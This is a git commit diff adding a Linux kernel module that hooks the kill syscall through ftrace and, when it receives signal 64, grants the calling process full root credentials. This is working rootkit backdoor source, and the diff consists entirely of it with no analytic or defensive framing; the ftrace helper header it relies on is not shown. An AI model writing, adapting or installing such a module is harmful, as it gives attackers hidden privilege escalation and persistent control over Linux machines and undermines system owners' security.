55be94edecbd6e47a17cd476ac66dfd6bef36d4c
fs3cs0ciety <fs3cs0ciety@gmail.com>
2024-11-05 12:54:38 -0500

    1.0_root_sig

--- src/1.0_root_sig/hook_kill.h
+++ src/1.0_root_sig/hook_kill.h
@@ -1,1 +1,42 @@
+#ifndef _HOOK_KILL_H_
+#define _HOOK_KILL_H_
 
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+notrace asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    void set_root(void);
+
+    int sig = regs->si;
+
+    if ( sig == 64 )
+    {
+        printk(KERN_INFO "lkm: Giving Root...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(regs);
+
+}
+
+
+// this section below is the set_root function
+
+void set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    commit_creds(root);
+}
+
+#endif
--- src/1.0_root_sig/lkm.c
+++ src/1.0_root_sig/lkm.c
@@ -1,4 +1,39 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/ >
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/version.h>
+
+#include "lkm.h"
+#include "hook_kill.h"
+
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+};
+
+static int __init lkm_init(void)
+{
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+
+    printk(KERN_INFO "lkm: LKM loaded into the kenrel successfully...\n");
+
+    return 0;
+}
+
+static void __exit lkm_exit(void)
+{
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "lkm: LKM Unloaded and cleaned up succesfully\n");
+}
+
+module_init(lkm_init);
+module_exit(lkm_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_VERSION("0.02");
+MODULE_AUTHOR("d3dsec");
